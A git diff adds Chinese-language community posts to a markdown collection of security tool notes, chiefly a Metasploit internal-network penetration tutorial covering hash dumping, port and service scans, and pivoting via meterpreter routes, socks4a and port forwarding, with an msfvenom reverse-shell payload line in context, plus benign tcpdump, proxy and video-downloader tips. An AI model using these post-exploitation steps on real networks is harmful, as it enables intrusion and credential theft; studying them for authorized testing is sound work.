@@ -15,6 +15,9 @@
 - [Cracking](#cracking)
 - [zANTI](#zanti)
 - [XSS'OR](#xssor)
+- [Proxy](#proxy)
+- [杂](#杂)
+
 
 ## 合集
 
@@ -273,6 +276,143 @@ msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.31.166 LPORT=1234 -f 
 
 ---
 
+<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-15:
+
+MSF内网渗透系列-信息收集
+
+对内网进行渗透，首先我们要做好信息收集工作，摸清楚内网环境
+
+总体上来说，内网环境无非两种：域和工作组。当然就只针对域的渗透，我们都可以单独拿出来，做一系列的教程了。
+
+这里我们做无差别处理。下面进入本系列正题，利用MSF进行内网信息收集：
+
+__本地常规信息收集__
+
+Windows：
+[https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Windows](https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Windows)
+
+
+
+Linux: 
+[https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Linux](https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Linux)
+
+
+
+__本地HASH__
+
+meterpreter下利用hashdump从SAM导出密码哈希值
+
+__MSF端口扫描__
+
+利用search portscan查找相关模块。如：auxiliary/scanner/portscan/tcp,我们可以利用该模块扫描同段开3389的机器:
+
+`..msf>use auxiliary/scanner/portscan/tcp`   //选择模块
+
+`..msf>set PORTS 3389`                      //设置端口
+
+`..msf>set RHOSTS 192.168.0.1/24`            //扫描192.168.0.1/24网段内开放3389的主机
+
+__MSF服务扫描__
+
+SMB版本识别：auxiliary/scanner/smb/smb_version  来尝试识别windows的版本
+
+MSSQL信息收集：search mssql相关模块，如auxiliary/scanner/mssql/mssql_ping 查询mssql监听的端口，默认1433
+
+SSH版本信息：auxiliary/scanner/ssh/ssh_version
+
+FTP版本识别：auxiliary/scanner/ftp/ftp_version
+
+HTTP服务：auxiliary/scanner/http/http_header  我一般用来扫描内网中的WEB服务器，返回相关头信息
+
+图：利用auxiliary/scanner/ssh/ssh_version识别metaslpoitable的ssh版本信息：
+
+<img src="https://images.xiaomiquan.com/FhNBOpcgNqENAJ_T4XpzZc9iDlgZ?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:--muZSfblaIxpdGW_mVD_44gmZs=" width="50%" height="50%" align="middle"/>
+
+
+---
+
+<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-23:
+
+MSF内网渗透系列——穿越边界
+
+前篇系列文章发出以后，很多新接触MSF小伙伴会有疑问:MSF做内网渗透总不能在内网找个机器安装一个MSF吧，这当然是可以的。还有小伙伴想到可以利用proxychain把MSF代理到目标内网，这也没毛病。
+
+下面我就介绍几个MSF自身穿越边界的姿势。
+
+假设我们在VPS上搭建了MSF，已经在目标内网中反弹回了一个meterpreter。那么我们就可以利用这个shell建立一条内网访问通道
+
+情景一：利用MSF扫描目标内网smb_version
+
+pivot是meterpreter最常用的一种代理，可以轻松把你的机器代理到目标内网环境
+
+sessions一下看看我们shell的信息：如下
+
+```
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+。msf exploit(web_delivery) > sessions
+。
+。Active sessions
+。===============
+。
+。  Id  Type                      Information  Connection
+。  --  ----                      -----------  ----------
+。  1   meterpreter python/linux  user @ test  8.8.8.8:443 -> 101.101.101.101:35272 (10.10.10.10)
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+```
+
+我们发现session的ID为1，内网ip为10.10.10.10
+
+那么就可以在metasploit添加一个路由表，目的是访问10.10.10.11将通过meterpreter的session 1 来访问，如下：
+
+```
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+。msf exploit(web_delivery) > route add 10.10.10.11 255.255.255.255 1  //route add  目标i或ip段  掩码  session的ID
+。
+。[*] Route added
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+```
+
+然后我们就可以：
+
+```
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+。msf exploit(web_delivery) > use auxiliary/scanner/smb/smb_version
+。
+。msf auxiliary(smb_version) > set rhosts 10.10.10.11  //如果想扫面整个C段 set rhosts 10.10.10.11/24
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+```
+
+如果我们想让其他一些工具（如：Nmap）利用该路由表到目标内网搞事情呢？
+
+这里MSF的socks4a模块就可以提供一个监听隧道供其他应用程序访问：auxiliary/server/socks4a
+
+情景二：访问目标内网一个服务器（10.10.10.12）80端口的web应用
+
+我们可以利用meterpreter的portfwd把内网web服务器的80端口转发到我们VPS(8.8.8.8)的8088端口。然后我们就可以通过
+[http://8.8.8.8:8088/](http://8.8.8.8:8088/)
+
+访问
+[http://10.10.10.12:80](http://10.10.10.12:80)
+
+
+
+首先session -i 1进入meterpreter，然后做端口转发，如下：
+
+```
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+。msf auxiliary(smb_version) > sessions -i 1
+。[*] Starting interaction with 1...
+。
+。meterpreter > portfwd add -l 8088 -r 192.168.31.169 -p 80
+。[*] Local TCP relay created: :8088 <-> 192.168.31.169:80
+。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
+```
+
+后记：在整理这篇文章的时候，就想着出个番外篇，专门整理一下其他穿越边界的各种姿势
+
+
+---
+
 
 ## DVWA
 
@@ -398,6 +538,42 @@ BeEF 是基于 Ruby 编写的，数据库使用的是 SQLite。如果你正好�
 
 
 ---
+
+## tcpdump
+
+
+<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-21:
+
+
+__#姿势#__
+
+在做网络分析这块，推荐最原生的命令 tcpdump
+
+“只要和网络沾边，都可以使用 tcpdump 来排查问题。”
+
+这篇文章作为 tcpdump 指南来说可供参考，虽然来说还是简单点，不过大多时候，我们不是职业做流量分析的，够用：
+
+
+[tcpdump 指南](https://zzyongx.github.io/blogs/tcpdump-tutorial.html)
+
+
+
+我 N 年前因为要调试一套复杂架构的网络问题，第一次上了 tcpdump，并结合 Wireshark 在本机进行可视化分析，效果很直接，一些复杂的问题容易找出本质。
+
+
+
+...
+
+<img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 分享一种玩法 -w - 
+输出pcap流到标准输出，管道或者其他方式实时读取分析
+用这种方式写了一些内部协议实时分析的脚本，已经普及到公司开发者使用，反馈不错
+
+<img src="https://file.xiaomiquan.com/c6/19/c619f2f8272cce087de22a13bf084787e929efee10e32381acfb833c8b9a7b3e.jpg" width="25px"/> __乌鸦__: 还有个问题分享下 -s0 参数受tcpdump版本限制。有时候抓不全包。 旧版本0就是65535
+
+...
+
+---
+
 
 ## nmap
 
@@ -1142,3 +1318,51 @@ XSS'OR - Hack with JavaScript 开源！
 <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: xssor.io 玩玩就知道
 
 ---
+
+## Proxy
+
+<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-07-20:
+
+for some reason，少年，抽个SSR吧
+
+[shadowsocks-rss/readme.md at master · breakwa11/sh...](https://github.com/breakwa11/shadowsocks-rss/blob/master/readme.md)
+
+
+
+...
+
+<img src="https://file.xiaomiquan.com/c7/0e/c70e5f97b5bc36fffa24c5b1d92138c1db4dd711c3802fcc6e6eb0aeaac50b03.jpg" width="25px"/> __Ctf__: 与NG版本的有什么区别吗
+
+<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/c7/0e/c70e5f97b5bc36fffa24c5b1d92138c1db4dd711c3802fcc6e6eb0aeaac50b03.jpg" width="25px"/> __Ctf__: 带混淆模块
+
+...
+
+---
+
+
+---
+
+## 杂
+
+
+<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@@ATToT__ on 2017-07-11:
+
+有趣实用的杂项分享
+
+You-Get 一款实用的网站视频下载工具（谁用谁知道）
+
+安装：`pip3 install you-get`
+
+用法：`you-get 视频播放页面的url`
+
+官方站： [You-Get](https://you-get.org/)
+
+github: [GitHub - soimort/you-get: Dumb downloader that scr...](https://github.com/soimort/you-get)
+
+支持以下网站的视频/音频下载:
+
+[SUPPORTED SITES](https://you-get.org/#supported-sites)
+
+---
+
+
